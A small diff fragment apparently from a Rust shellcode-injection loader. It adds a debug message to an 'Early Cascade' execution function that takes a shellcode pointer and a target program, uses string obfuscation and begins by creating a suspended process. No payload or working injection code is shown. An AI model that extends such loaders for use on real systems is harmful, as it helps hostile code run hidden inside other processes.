@@ -6,6 +6,9 @@ mod stub;
 
 #[cfg(feature = "run_early_cascade")]
 pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &str) -> Result<(), String> {
+    #[cfg(feature = "debug")]
+    crate::utils::print_message("Executing via Early Cascade...");
+    
     use obfstr::obfstr;
 
     // 1. Create Process in Suspended State
